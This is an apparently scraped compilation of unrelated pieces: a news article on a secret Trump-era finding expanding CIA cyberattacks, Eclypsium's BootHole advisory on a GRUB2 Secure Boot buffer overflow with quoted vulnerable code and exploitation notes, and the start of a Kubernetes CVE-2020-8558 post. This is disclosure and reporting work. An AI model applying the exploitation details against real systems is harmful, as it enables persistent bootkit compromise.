1. Financial institutions. It loosens prior restrictions on disruptive or destructive targeting of financial institutions, former U.S. officials said.
- In prior administrations, wiping or dumping hacked banking data was considered an uncrossable line because of the potential effects of retaliation by foreign states on the U.S. banking system, said former officials.
- Treasury Department officials were always particularly vociferously opposed to such measures in the past, said former officials.
- “These were “things CIA always knew were an option, but were always a bridge too far," a former official told Yahoo News. “They had been bandied about at senior levels for a long time, but cooler heads had always prevailed."
2. "Cut-outs." The presidential authorization makes it much easier for the CIA to target “cut-outs” believed to be working surreptitiously for hostile foreign intelligence services at media organizations, charities, religious institutions or other nonstate entities for disruptive or destructive cyber actions, said former officials. In the past, the burden of proof for targeting such entities was high; now, standards have been made far more lax, said former officials.
3. The "big four." The finding explicitly enables the CIA to use these new powers against the “big four” U.S. adversaries — China, Russia, Iran and North Korea. But even though the CIA already had more legal maneuverability on covert operations against Iran than other U.S. foes, the Trump administration was particularly focused on escalating its activities against Tehran, said former officials.
- These new CIA authorities, as well as a capacious interpretation of prior ones, have contributed to the administration’s “maximum pressure” campaign against Iran, say former officials, with the CIA conducting disruptive cyberattacks against Iranian infrastructure throughout Trump's term.
- This maximum pressure campaign has been tantamount to a “regime destabilization” strategy for some senior Trump-era national security officials, aiming to weaken the Iranian government in order to force it to retreat to its own borders — and even hopefully collapse entirely, say former officials.
The big picture: Some officials emphasize that Trump-era shifts in U.S. offensive cyber operations are part of a natural evolution in U.S. policies in this arena and that many changes would have been granted under a new Democratic administration as well.
- “It’s not like some cabal of folks who had been sort of outside the national security establishment ... were then brought in and hijacked” this process, a former senior official told me.

Exclusive: Secret Trump order gives CIA more powers to launch cyberattacks

Scroll back up to restore default view.
The Central Intelligence Agency has conducted a series of covert cyber operations against Iran and other targets since winning a secret victory in 2018 when President Trump signed what amounts to a sweeping authorization for such activities, according to former U.S. officials with direct knowledge of the matter.
The secret authorization, known as a presidential finding, gives the spy agency more freedom in both the kinds of operations it conducts and who it targets, undoing many restrictions that had been in place under prior administrations. The finding allows the CIA to more easily authorize its own covert cyber operations, rather than requiring the agency to get approval from the White House.
Unlike previous presidential findings that have focused on a specific foreign policy objective or outcome — such as preventing Iran from becoming a nuclear power — this directive, driven by the National Security Council and crafted by the CIA, focuses more broadly on a capability: covert action in cyberspace.
The “very aggressive” finding “gave the agency very specific authorities to really take the fight offensively to a handful of adversarial countries,” said a former U.S. government official. These countries include Russia, China, Iran and North Korea — which are mentioned directly in the document — but the finding potentially applies to others as well, according to another former official. “The White House wanted a vehicle to strike back,” said the second former official. “And this was the way to do it.”

The CIA’s new powers are not about hacking to collect intelligence. Instead, they open the way for the agency to launch offensive cyber operations with the aim of producing disruption — like cutting off electricity or compromising an intelligence operation by dumping documents online — as well as destruction, similar to [the U.S.-Israeli 2009 Stuxnet attack]( which destroyed centrifuges that Iran used to enrich uranium gas for its nuclear program.
The finding has made it easier for the CIA to damage adversaries’ critical infrastructure, such as petrochemical plants, and to engage in the kind of hack-and-dump operations that Russian hackers and WikiLeaks popularized, in which tranches of stolen documents or data are leaked to journalists or posted on the internet. It has also freed the agency to conduct disruptive operations against organizations that were largely off limits previously, such as banks and other financial institutions.
Another key change with the finding is it lessened the evidentiary requirements that limited the CIA’s ability to conduct covert cyber operations against entities like media organizations, charities, religious institutions or businesses believed to be working on behalf of adversaries’ foreign intelligence services, as well as individuals affiliated with these organizations, according to former officials.
“Before, you would need years of signals and dozens of pages of intelligence to show that this thing is a de facto arm of the government,” a former official told Yahoo News. Now, “as long as you can show that it vaguely looks like the charity is working on behalf of that government, then you’re good.”
The CIA has wasted no time in exercising the new freedoms won under Trump. Since the finding was signed two years ago, the agency has carried out at least a dozen operations that were on its wish list, according to this former official. “This has been a combination of destructive things — stuff is on fire and exploding — and also public dissemination of data: leaking or things that look like leaking.”
Some CIA officials greeted the new finding as a needed reform that allows the agency to act more nimbly. “People were doing backflips in the hallways [when it was signed],” said another former U.S. official.
But critics, including some former U.S. officials, see a potentially dangerous attenuation of intelligence oversight, which could have unintended consequences and even put people’s lives at risk, according to former officials.
The involvement of U.S. intelligence agencies in hack-and-dump activities also raises uncomfortable comparisons for some former officials. “Our government is basically turning into f****ing WikiLeaks, [using] secure communications on the dark web with dissidents, hacking and dumping,” said one such former official.
The CIA declined to comment or respond to an extensive list of questions from Yahoo News. The National Security Council did not respond to multiple written requests for comment.
While the CIA has been pushing for years to expand its cyber authorities, Russia’s interference in the 2016 election led Obama officials to [grasp for new ways to retaliate against the Kremlin]( High-level discussions included proposals for the CIA to dump embarrassing hacked information about Russian officials online, as well as to destroy Russian servers, according to former officials.
But just days away from launching operations in the late summer of 2016, intelligence operatives [were told to stand down]( according to former officials. The decision to do so was made at the highest levels of the Obama administration, according to a former senior national security official.
During the early days of the Trump administration, intelligence officials were hopeful that the president would give the go-ahead to those operations. But senior Trump officials weren’t interested in retaliating against Russia for the election interference, according to a former official. “It was radio silence,” the former official said. “It all dissipated, went to nothing.”
While plans for immediate cyber retaliation against Russia faded, discussions about expanding the CIA’s cyber authorities continued to accelerate under Trump. For years, the CIA had bristled under what some intelligence officials considered onerous barriers to covert action in cyberspace that prevented it from even proposing many operations, according to former officials.
When it came to covert action, “you always had the two camps [inside the CIA],” said Robert Eatinger, who served at the CIA for 24 years, including a stint as the agency’s top lawyer. There were “those who felt that their hands were too tied, and those who felt the restrictions were wise and appropriate,” recalled Eatinger, who said he has no knowledge of the CIA cyber finding signed by Trump and wouldn’t discuss specific incidents that occurred during his time with the agency.
Advocates for greater cyber authorities gained the upper hand in these debates under the Trump administration, which encouraged the CIA to stretch its prior authorities to pursue more aggressive offensive cyber operations — particularly against Iran. “Trump wanted to push decision making to the lowest possible denominator,” said a former intelligence official.
Mike Pompeo made that point clear after Trump made him CIA director in January 2017. Pompeo’s message, the former official said, was: “We don’t want to hold you up, we want to move, move, move.”
A current senior intelligence official, who declined to discuss specific U.S. government operations or policies, called Trump-era interest in offensive operations “phenomenal.” The CIA, the National Security Agency and the Pentagon “have been able to play like we should be playing in the last couple years,” the current official said.
John Bolton’s appointment as national security adviser in April 2018 gave another boost to those seeking to ease restrictions on cyber operations. “We needed to scrap the Obama-era rules and replace them with a more agile, expeditious decision-making structure,” Bolton writes in his recently published memoir, “The Room Where It Happened.” Part of this involved strengthening the U.S. government’s “clandestine capabilities” in cyberspace against “nonstate actors” and others, he writes.
In September 2018, Bolton announced that Trump had signed a presidential directive [easing Obama-era rules]( governing military cyber operations. Although the administration disclosed the existence of that directive — known as National Security Presidential Memorandum 13 — the underlying rules of engagement for military cyber operations remain secret. The administration also kept secret the CIA finding, which gave the agency its new authorities.
The CIA’s new cyber powers prompted concerns among some officials. “Trump came in and way overcorrected,” said a former official. Covert cyber operations that in the past would have been rigorously vetted through the NSC, with sometimes years-long gaps between formulation and execution, now go “from idea to approval in weeks,” said the former official.
Former officials declined to speak in detail about cyber operations the CIA has carried out as a result of the finding, but they said the agency has already conducted covert hack-and-dump actions aimed at both Iran and Russia.
For example, the CIA has dumped information online about an ostensibly independent Russian company that was “doing work for Russian intelligence services,” said a former official. While the former official declined to be more specific, BBC Russia reported [in July 2019]( that hackers had breached the network of SyTech, a company that does work for the FSB, Russia’s domestic spy agency, and stolen about 7.5 terabytes of data; the data from that hack was [passed to media organizations](
In another stunning hack-and-dump operation, an unknown group in March 2019 posted on the internet chat platform Telegram the names, addresses, phone numbers and photos of Iranian intelligence officers allegedly involved in hacking operations, as well as hacking tools used by Iranian intelligence operatives. That November, the details of 15 million debit cards for customers of three Iranian banks linked to Iran’s Islamic Revolutionary Guard Corps were also dumped on Telegram.
Although sources wouldn’t say if the CIA was behind those Iran breaches, the finding’s expansion of CIA authorities to target financial institutions, such as an operation to leak bank card data, represents a significant escalation in U.S. cyber operations. Under prior administrations, senior Treasury Department officials argued successfully against leaking or wiping out banking data, according to former officials, because it could destabilize the global financial system. These were operations the “CIA always knew were an option, but were always a bridge too far," said a former official. “They had been bandied about at senior levels for a long time, but cooler heads had always prevailed."
The new cyber finding further emboldened the CIA’s operations against Iran, according to former officials. Even before Trump signed the directive, administration officials were already encouraging the CIA to aggressively interpret preexisting secret Iran-related authorities to help prosecute the administration’s “maximum pressure” campaign against Tehran. Using the Cold War strategy of rolling back the Soviet Union as inspiration, senior Trump national security officials believed that destabilizing Iran within its borders would force the regime to cease its adventurism abroad and, perhaps, collapse.
The maximum-pressure campaign includes punishing economic sanctions, but has also involved CIA cyberattacks on Iranian infrastructure, said former officials. “It was obvious that destabilization was the plan on Iran,” said one former official, and Trump administration officials were eager to have the CIA conduct destructive cyber operations against targets inside that country. Bolton “wanted another tool, he wanted another hammer. He was looking at Stuxnet and how to be mean to Iran, so that was probably attractive to him,” said another source.
The Trump administration was able to lean on extensive legal powers for covert action against the Islamic Republic that were already on the books, including a presidential finding dating back at least to the early 2000s devoted to counterproliferation — in other words, preventing a nuclear-armed Iran, according to former officials. Another long-standing Iran-focused presidential finding authorizes the CIA to counter Tehran’s influence in the Middle East, in particular by combating Iran’s Islamic Revolutionary Guard Corps and by supporting groups in the region opposed to the regime, according to former U.S. officials.
Neither these two Iran-related findings, nor the new cyber finding, mention regime change as a stated goal, according to former officials. Over time, however, the CIA and other national security officials have interpreted the first two Iran findings increasingly broadly, with covert activities evolving from their narrow focus on stopping Tehran’s nuclear program, they said. The Iran findings have been subject to “classic mission creep,” said one former official.
Fatigue from having to continually beat back Iran’s nuclear progress gradually led U.S. officials to take an even more aggressive approach that began to resemble a regime change strategy, according to former officials. The thinking became “If we can impact the regime, then no bomb,” said another former official. “We’re playing semantics — destabilization is functionally the same thing as regime change. It’s a deniability issue,” the former official said.
While the CIA’s new powers expand the agency’s ability to target Iran and other foreign adversaries, they also present potential pitfalls, according to former officials. The CIA and the Pentagon have long tussled over authorities in cyberspace, and these coordination issues will only become more critical now, according to former officials — especially when U.S. military operatives online unknowingly run up against their counterparts from the CIA.
“If you’re doing something on someone’s network and you have friendly forces also on the network, you don’t want to have fratricide,” said a former senior military intelligence official. Even inside the U.S. intelligence community, the CIA has a reputation for secrecy, according to former officials. The CIA’s “deconfliction is poor, they’re not keeping people in the loop on what their cyber operations are,” said another former official.
Some former officials even worry about the oversight of cyber operations within the CIA. Agency cyber operatives “weren’t always transparent” about their activities, said a former senior official. “It was a problem. There were times I was surprised.”
This more permissive environment may also intensify concerns about the CIA’s ability to secure its hacking arsenal. In 2017, WikiLeaks published a large cache of CIA hacking tools known as “Vault 7.” The leak, which a partially declassified [CIA assessment]( called “the largest data loss in CIA history,” was made possible by “woefully lax” security practices at the CIA’s top hacker unit, the assessment said.
Eatinger, the former top CIA attorney, who retired in 2015, said it’s unclear to him whether the new cyber finding would be a return to the agency’s more freewheeling days of the 1980s, or something that goes even further. Either way, it’s a “big deal,” he said.
Removing NSC oversight of covert operations is a significant departure from recent history, according to Eatinger. “I would look at the intel community as the same as the military in that there should be civilian control of big decisions — who to go to war against, who to launch an attack against, who to fight a particular battle,” he said. “It makes sense that you would have that kind of civilian or non-intelligence civilian leadership for activities as sensitive as covert action.”
Regardless, these expansive new cyber powers may become a lasting legacy of the Trump administration, solidifying the greater role the CIA has long coveted in a key arena, and providing the agency with authorities it has desired for three presidential administrations.
“People thought, ‘Hey, George W. Bush will sign this,’ but he didn’t,” said a former official. CIA officials then believed, “‘Obama will sign it.’ Then he didn’t.”
“Then Trump came in, and CIA thought he wouldn’t sign,” recalled this official. “But he did.”

my favorite take so far:
``Our government is basically turning into f****ing WikiLeaks, [using] secure communications on the dark web with dissidents, hacking and dumping,” said one such former official.

“BootHole” vulnerability in the GRUB2 bootloader opens up Windows and Linux devices using Secure Boot to attack. All operating systems using GRUB2 with Secure Boot must release new installers and bootloaders.
[Download the PDF >](
Eclypsium researchers have discovered a vulnerability — dubbed “BootHole” — in the GRUB2 bootloader utilized by most Linux systems that can be used to gain arbitrary code execution during the boot process, even when Secure Boot is enabled. Attackers exploiting this vulnerability can install persistent and stealthy bootkits or malicious bootloaders that could give them near-total control over the victim device.
The vulnerability affects systems using Secure Boot, even if they are not using GRUB2. Almost all signed versions of GRUB2 are vulnerable, meaning virtually every Linux distribution is affected. In addition, GRUB2 supports other operating systems, kernels and hypervisors such as Xen. The problem also extends to any Windows device that uses Secure Boot with the standard Microsoft Third Party UEFI Certificate Authority. Thus the majority of laptops, desktops, servers and workstations are affected, as well as network appliances and other special purpose equipment used in industrial, healthcare, financial and other industries. This vulnerability makes these devices susceptible to attackers such as the [threat actors recently discovered]( using malicious UEFI bootloaders.
Eclypsium has coordinated the responsible disclosure of this vulnerability with a variety of industry entities, including OS vendors, computer manufacturers, and CERTs. Mitigation will require new bootloaders to be signed and deployed, and vulnerable bootloaders should be revoked to prevent adversaries from using older, vulnerable versions in an attack. This will likely be a long process and take considerable time for organizations to complete patching.

Background: Secure Boot, GRUB2, and CAs
Secure Boot can be a fairly deep and technical topic. Our goal here is to give a high-level introduction to the key concepts relevant to this research without going into all the granular details. We have included a variety of external links to provide additional information for those interested. Alternatively, you can go straight to the [description of the vulnerability]( itself.
Threats to the Boot Process
The boot process is one of the most fundamentally important aspects of security for any device. It relies on a variety of firmware that controls how a device’s various components and peripherals are initialized and ultimately coordinates the loading of the operating system itself. In general, the earlier code is loaded, the more privileged it is.
If this process is compromised, attackers can control how the operating system is loaded and subvert all higher-layer security controls. Recent research has identified ransomware in the wild using [malicious EFI bootloaders]( as a way to take control of machines at the time of boot. Previously threat actors used malware tampering with legacy OS bootloaders including [APT41 Rockboot]( [LockBit]( [FIN1 Nemesis]( [MBR-ONI]( [Petya/NotPetya]( and [Rovnix](
Additional information on threats to the modern PC boot process is available in the “[Bootkits and UEFI Secure Boot]( section of the System Firmware training.
UEFI Secure Boot
UEFI Secure Boot was originally developed by the UEFI Forum as a way to protect the boot process from these types of attacks. There are other implementations of secure boot designed for different environments, but UEFI Secure Boot is the standard for PCs and servers. The goal is to prevent malicious code from being introduced into the boot process by cryptographically checking each piece of firmware and software before it is run. Any code not recognized as valid is not executed in the boot process.
Secure Boot uses cryptographic signatures to verify the integrity of each piece of code as it is needed during the boot process. There are two critical databases involved in this process: the Allow DB (db) of approved components and the Disallow DB (dbx) of vulnerable or malicious components, including firmware, drivers, and bootloaders. Access to modify these databases is protected by a Key Exchange Key (KEK), which in turn is verified by a Platform Key (PK). Although the PK is used as a root of trust for updates to the platform, it’s not expressly part of the boot process (but is shown below for reference). It is dbx, db, and KEK that are used to verify the signatures for loaded executables at boot time.
Additional details on the Secure Boot process can be found in this [PDF](
Chains of Trust and GRUB2
Next, OEMs must manage a list of who is permitted to sign code trusted by the Secure Boot Database. Instead of having every OEM manage certificates from every possible firmware, driver, or OS provider, Secure Boot allows for the use of a centralized Certificate Authority (CA). Microsoft’s 3rd Party UEFI CA provides the industry standard signing service for Secure Boot. In short, third parties can submit their code to Microsoft, and Microsoft will validate and sign the code with the Microsoft CA. This establishes a chain of trust that only requires OEMs to enroll the Microsoft 3rd Party UEFI CA to their platforms to enable them to boot third-party installation media and operating systems by default when Secure Boot is enabled.
This includes the ability to sign bootloaders from non-Microsoft operating systems such as Linux. In almost every modern Linux distribution, GRUB (the Grand Unified Bootloader) is the bootloader that loads and transfers control to the operating system. In this document, all references to GRUB are intended to refer to GRUB2, which was a complete rewrite from the previous version commonly referred to as “GRUB Legacy.” Starting in 2009, all widely used Linux distributions have transitioned to using GRUB2. GRUB Legacy has been deprecated and is generally only found in older releases.
[Due to legal issues arising from license incompatibilities]( open-source projects and other third parties build a small application called a “shim,” which contains the vendor’s certificate and code that verifies and runs the bootloader (GRUB2). The vendor’s shim is verified using the Microsoft 3rd Party UEFI CA and then the shim loads and verifies the GRUB2 bootloader using the vendor certificate embedded inside itself.
Additional detail on the role of the Microsoft UEFI CA in the boot process is available [here](
Challenges of Secure Boot
As with any technical process, Secure Boot is not without its potential problems. The process involves many pieces of code, and a vulnerability in any one of them presents a single point of failure that could allow an attacker to bypass Secure Boot. Additionally, although UEFI Secure Boot attempts to provide certain integrity guarantees to the boot process, other misconfigurations of the hardware or missing protection features can undermine boot security. One such example is a [DMA attack]( using tools such as [PCIe Microblaze]( Additionally, as we will show in this blog post, a vulnerability in the boot process that enables arbitrary code execution can allow attackers to control the boot process and operating system, even when secure boot signatures are verified.
Attackers can also use a vulnerable bootloader against the system. For example, if a valid bootloader was found to have a vulnerability, a piece of malware could replace the device’s existing bootloader with the vulnerable version. The bootloader would be allowed by Secure Boot and give the malware complete control over the system and OS. Mitigating this requires very active management of the dbx database used to identify malicious or vulnerable code.
Additionally, updates and fixes to the Secure Boot process can be particularly complex and run the risk of inadvertently [breaking machines]( The boot process naturally involves a variety of players and components including device OEMs, operating system vendors, and administrators. Given the fundamental nature of the boot process, any sort of problems run a high risk of rendering a device unusable. As a result, updates to Secure Boot are typically slow and require extensive industry testing.
Breaking Secure Boot Through GRUB2
In the course of Eclypsium’s analysis, we have identified a buffer overflow vulnerability in the way that GRUB2 parses content from the GRUB2 config file (grub.cfg). Of note: The GRUB2 config file is a text file and typically is not signed like other files and executables. This vulnerability enables arbitrary code execution within GRUB2 and thus control over the booting of the operating system. As a result, an attacker could modify the contents of the GRUB2 configuration file to ensure that attack code is run before the operating system is loaded. In this way, attackers gain persistence on the device.
Such an attack would require an attacker to have elevated privileges. However, it would provide the attacker with a powerful additional escalation of privilege and persistence on the device, even with Secure Boot enabled and properly performing signature verification on all loaded executables. One of the explicit design goals of Secure Boot is to prevent unauthorized code, even running with administrator privileges, from gaining additional privileges and pre-OS persistence by disabling Secure Boot or otherwise modifying the boot chain.
With the sole exception of one bootable tool vendor who added custom code to perform a signature verification of the grub.cfg config file in addition to the signature verification performed on the GRUB2 executable, all versions of GRUB2 that load commands from an external grub.cfg configuration file are vulnerable. As such, this will require the release of new installers and bootloaders for all versions of Linux. Vendors will need to release new versions of their bootloader shims to be signed by the Microsoft 3rd Party UEFI CA. It is important to note that until all affected versions are added to the dbx revocation list, an attacker would be able to use a vulnerable version of shim and GRUB2 to attack the system. This means that every device that trusts the Microsoft 3rd Party UEFI CA will be vulnerable for that period of time.
In addition to vendors using shims signed by the Microsoft 3rd Party UEFI CA, some OEMs that control both the hardware and the software stack in their devices use their own key that is provisioned into the hardware at the factory to sign GRUB2 directly. They will need to provide updates and revocation of previous vulnerable versions of GRUB2 for these systems as well.
This vulnerability was assigned CVE-2020-10713 “GRUB2: crafted grub.cfg file can lead to arbitrary code execution during boot process” with a CVSS rating of 8.2 (High) / CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H.

Vulnerability Analysis
The vulnerability is a buffer overflow that occurs in GRUB2 when parsing the grub.cfg file. This configuration file is an external file commonly located in the EFI System Partition and can therefore be modified by an attacker with administrator privileges without altering the integrity of the signed vendor shim and GRUB2 bootloader executables. The buffer overflow allows the attacker to gain arbitrary code execution within the UEFI execution environment, which could be used to run malware, alter the boot process, directly patch the OS kernel, or execute any number of other malicious actions.
To dig a little deeper into the vulnerability itself, we’ll take a closer look at how the code works internally. In order to process commands from the external configuration file, GRUB2 uses flex and bison to generate a parsing engine for a domain-specific language (DSL) from language description files and helper functions.
This is generally considered to be a better approach than manually writing a custom parser for each DSL. However, GRUB2, flex, and bison are all complex software packages with their own design assumptions that can be easy to overlook. And those mismatched design assumptions can result in vulnerable code.
The parser engine generated by flex includes this define as part of the token processing code:
 YY_DO_BEFORE_ACTION \
    yyg->yytext_ptr = yy_bp; \
    yyleng = (int) (yy_cp - yy_bp); \
    yyg->yy_hold_char = *yy_cp; \
    *yy_cp = '\0'; \
if ( yyleng >= YYLMAX ) \
        YY_FATAL_ERROR( "token too large, exceeds YYLMAX" ); \
yy_flex_strncpy( yytext, yyg->yytext_ptr, yyleng + 1 , yyscanner); \
    yyg->yy_c_buf_p = yy_cp;
In this macro, the generated code detects that it has encountered a token that is too large to fit into flex’s internal parse buffer and calls YY_FATAL_ERROR(), which is a helper function provided by the software that is using the flex-generated parser.
However, the YY_FATAL_ERROR() implementation provided in the GRUB2 software package is:
 YY_FATAL_ERROR(msg)                     \
  do {                                          \
grub_printf (_("fatal error: %s\n"), _(msg));     \
} while (0)
Rather than halting execution or exiting, it just prints an error to the console and returns to the calling function. Unfortunately, the flex code has been written with the expectation that any calls to YY_FATAL_ERROR() will never return. This results in yy_flex_strncpy() being called and copying the source string from the configuration file into a buffer that is too small to contain it.
Beyond just this specific path, a number of additional places throughout the flex-generated code also expect that any calls to YY_FATAL_ERROR() never return and perform unsafe operations when that expectation is broken. Mismatched assumptions between producers and consumers of an API are a very common source of vulnerabilities.
Ultimately, by providing a configuration file with input tokens that are too long to be handled by the parser, this buffer overflow overwrites critical structures in the heap. These overwritten fields include internal parser structure elements, which can be used as an arbitrary write-what-where primitive to gain arbitrary code execution and hijack the boot process.
Of further note, the UEFI execution environment does not have Address Space Layout Randomization (ASLR) or Data Execution Prevention (DEP/NX) or other exploit mitigation technologies typically found in modern operating systems, so creating exploits for this kind of vulnerability is significantly easier. The heap is fully executable without the need to build ROP chains.
Finally, rather than being architecture-specific, this vulnerability is in a common code path and was also confirmed using a signed ARM64 version of GRUB2.
Additional Vulnerabilities
There have been a couple of examples of previous vulnerabilities found in GRUB2 that result in arbitrary code execution, but with a much smaller scope.
In April 2019, a vulnerability in how GRUB2 was used by the Kaspersky Rescue Disk was [publicly disclosed]( In February 2020, more than six months after a fixed version had been released, Microsoft pushed an update to revoke the vulnerable bootloader across all Windows systems by updating the UEFI revocation list (dbx) to block the known-vulnerable Kaspersky bootloader. Unfortunately, this resulted in systems from multiple vendors encountering unexpected errors, including bricked devices, and the [update was removed from the update servers](
Additionally, in May 2020, Dmytro Oleksiuk [disclosed]( that certain HPE ProLiant servers contained a version of GRUB2 signed by a HP CA that allows the use of the “insmod” command to load unsigned code. This issue was assigned CVE-2020-7205 and is also embargoed until July 29th.
In response to our initial vulnerability report, additional scrutiny was applied to the GRUB2 code and a number of additional vulnerabilities were discovered by the Canonical security team:
- CVE-2020-14308 GRUB2: grub_malloc does not validate allocation size allowing for arithmetic overflow and subsequent heap-based buffer overflow
- 6.4 (Medium) / CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H
- CVE-2020-14309 GRUB2: Integer overflow in grub_squash_read_symlink may lead to heap based overflow
- 5.7 (Medium) / CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:N/I:H/A:H
- CVE-2020-14310 GRUB2: Integer overflow read_section_from_string may lead to heap based overflow
- 5.7 (Medium) / CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:N/I:H/A:H
- CVE-2020-14311 GRUB2: Integer overflow in grub_ext2_read_link leads to heap based buffer overflow,
- 5.7 (Medium) / CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:N/I:H/A:H
- CVE-2020-15705 GRUB2: avoid loading unsigned kernels when grub is booted directly under secure boot without shim
- 6.4 (Medium) /CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H
- CVE-2020-15706 GRUB2 script: Avoid a use-after-free when redefining a function during execution
- 6.4 (Medium) /CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H
- CVE-2020-15707 GRUB2: Integer overflow in initrd size handling.
- 5.7 (Medium) /CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:N/I:H/A:H
Given the difficulty of this kind of ecosystem-wide update/revocation, there is a strong desire to avoid having to do it again six months later. To that end, a large effort — spanning multiple security teams at Oracle, Red Hat, Canonical, VMware, and Debian — using static analysis tools and manual review helped identify and fix dozens of further vulnerabilities and dangerous operations throughout the codebase that do not yet have individual CVEs assigned.
Due to a weakness in the way GRUB2 parses its configuration file, an attacker can execute arbitrary code that bypasses signature verification. The Boot Hole vulnerability discovered by Eclypsium can be used to install persistent and stealthy bootkits or malicious bootloaders that operate even when Secure Boot is enabled and functioning correctly. This can ensure attacker code runs before the operating system and can allow the attacker to control how the operating system is loaded, directly patch the operating system, or even direct the bootloader to alternate OS images. It gives the attacker virtually unlimited control over the victim device. Malicious bootloaders have recently been [observed in the wild]( and this vulnerability would make devices susceptible to these types of threats.
All signed versions of GRUB2 that read commands from an external grub.cfg file are vulnerable, affecting every Linux distribution. To date, more than 80 shims are known to be affected. In addition to Linux systems, any system that uses Secure Boot with the standard Microsoft UEFI CA is vulnerable to this issue. As a result, we believe that the majority of modern systems in use today, including servers and workstations, laptops and desktops, and a large number of Linux-based OT and IoT systems, are potentially affected by these vulnerabilities.
Additionally, any hardware root of trust mechanisms that rely on UEFI Secure Boot could be bypassed as well.
Full mitigation of this issue will require coordinated efforts from a variety of entities: affected open-source projects, Microsoft, and the owners of affected systems, among others. This will include:
- Updates to GRUB2 to address the vulnerability.
- Linux distributions and other vendors using GRUB2 will need to update their installers, bootloaders, and shims.
- New shims will need to be signed by the Microsoft 3rd Party UEFI CA.
- Administrators of affected devices will need to update installed versions of operating systems in the field as well as installer images, including disaster recovery media.
- Eventually the [UEFI revocation list (dbx)]( needs to be updated in the firmware of each affected system to prevent running this vulnerable code during boot.
On the Coordinated Release Date (CRD) of July 29, we expect to see advisories and/or updates from the following affected parties:
- Microsoft
- UEFI Security Response Team (USRT)
- Oracle
- Red Hat (Fedora and RHEL)
- Canonical (Ubuntu)
- SuSE (SLES and openSUSE)
- Debian
- Citrix
- VMware
- Various OEMs
- Software vendors, including security software, are also impacted by this vulnerability and will be updating their bootloaders.
- … more to be added once we have a full list …
However, full deployment of this revocation process will likely be very slow. UEFI-related updates have had a [history of making devices unusable]( and vendors will need to be very cautious. If the revocation list (dbx) is updated before a given Linux bootloader and shim are updated, then the operating system will not load. As a result, updates to the revocation list will take place over time to prevent breaking systems that have yet to be updated. There are also edge cases where updating the dbx can be difficult, such as with dual-boot or deprovisioned machines. When any OS is installed or launched, the bootloader and OS need to be updated before the revocation is applied to the system.
Further complicating matters, enterprise disaster recovery processes can run into issues where approved recovery media no longer boots on a system if dbx updates have been applied. In addition when a device swap is needed due to failing hardware, new systems of the same model may have already had dbx updates applied and will fail when attempting to boot previously-installed operating systems. Before dbx updates are pushed out to enterprise fleet systems, recovery and installation media must be updated and verified as well.
Microsoft will be releasing a set of signed dbx updates, which can be applied to systems to block shims that can be used to load the vulnerable versions of GRUB2. Due to the risk of bricking systems or otherwise breaking operational or recovery workflows, these dbx updates will initially be made available for interested parties to manually apply to their systems rather than pushing the revocation entries and applying them automatically. This will allow IT professionals, enthusiasts, and others the opportunity to test the revocation updates on their individual systems and identify any issues before making the revocations mandatory.
Organizations should additionally ensure they have appropriate capabilities for monitoring UEFI bootloaders and firmware and verifying UEFI configurations, including revocation lists, in their systems. Organizations should also test recovery capabilities as updates become available, including the “reset to factory defaults” functionality in the UEFI setup. This will ensure that they can recover devices if a device is negatively impacted by an update. Finally, organizations should be monitoring their systems for threats and ransomware that use vulnerable bootloaders to infect or damage systems.
- Right away, start monitoring the contents of the bootloader partition (EFI system partition). This will buy time for the rest of the process and help identify affected systems in your environment. For those who have deployed the Eclypsium solution, you can see this monitoring under the “MBR/Bootloader” component of a device.
- Continue to install OS updates as usual across desktops, laptops, servers, and appliances. Attackers can leverage privilege escalation flaws in the OS and applications to take advantage of this vulnerability so preventing them from gaining administrative level access to your systems is critical. Systems are still vulnerable after this, but it is a necessary first step. Once the revocation update is installed later, the old bootloader should stop working. This includes rescue disks, installers, enterprise gold images, virtual machines, or other bootable media.
- Test the revocation list update. Be sure to specifically test the same firmware versions and models that are used in the field. It may help to update to the latest firmware first in order to reduce the number of test cases.
- To close this vulnerability, you need to deploy the revocation update. Make sure that all bootable media has received OS updates first, roll it out slowly to only a small number of devices at a time, and incorporate lessons learned from testing as part of this process.
- Engage with your third-party vendors to validate they are aware of, and are addressing, this issue. They should provide you a response as to its applicability to the services/solutions they provide you as well as their plans for remediation of this high rated vulnerability.
While Secure Boot is easily taken for granted by most users, it is the foundation of security within most devices. Once compromised, attackers can gain virtually complete control over the device, its operating system, and its applications and data. And as this research shows, when problems are found in the boot process, they can have far-reaching effects across many types of devices.
We will update this blog post as more information becomes available, and we encourage users and administrators to closely monitor alerts and notifications from their hardware vendors, the [Microsoft MSRC]( and any relevant open-source projects.

Kubernetes Vulnerability Puts Clusters at Risk of Takeover (CVE-2020-8558)
Executive Summary
A security issue assigned [CVE-2020-8558]( was recently discovered in the kube-proxy, a networking component running on Kubernetes nodes. The issue exposed internal services of Kubernetes nodes, often run without authentication. On certain Kubernetes deployments, this could have exposed the api-server, allowing an unauthenticated attacker to gain complete control over the cluster. An attacker with this sort of access could steal information, deploy crypto miners or remove existing services altogether.
The vulnerability exposed nodes’ localhost services – services meant to be accessible only from the node itself – to hosts on the local network and to pods running on the node. Localhost bound services expect that only trusted, local processes can interact with them, and thus often serve requests without authentication. If your nodes run localhost services without enforcing authentication, you are affected.
The issue details were [made public]( on April 18, 2020, and a [patch]( released on June 1, 2020. We worked to assess additional impact to Kubernetes clusters and found that some Kubernetes installations don’t disable the api-server insecure-port, which is normally only accessible from within the master node. Exploiting CVE-2020-8558, attackers can gain access to the insecure-port and gain full control over the cluster.
We alerted the Kubernetes security team of the potential impact of this vulnerability. In turn, the team rated the vulnerability’s impact as High in clusters where the api-server insecure-port is enabled, and otherwise Medium. Luckily, CVE-2020-8558’s impact is somewhat reduced on most hosted Kubernetes services like Azure Kubernetes Service (AKS), Amazon’s Elastic Kubernetes Service (EKS) and Google Kubernetes Engine (GKE). CVE-2020-8558 was patched in Kubernetes versions v1.18.4, v1.17.7, and v1.16.11 (released June 17, 2020). All users are encouraged to update.
Prisma Cloud customers are protected from this vulnerability through the capabilities described in the Conclusion section.
The kube-proxy
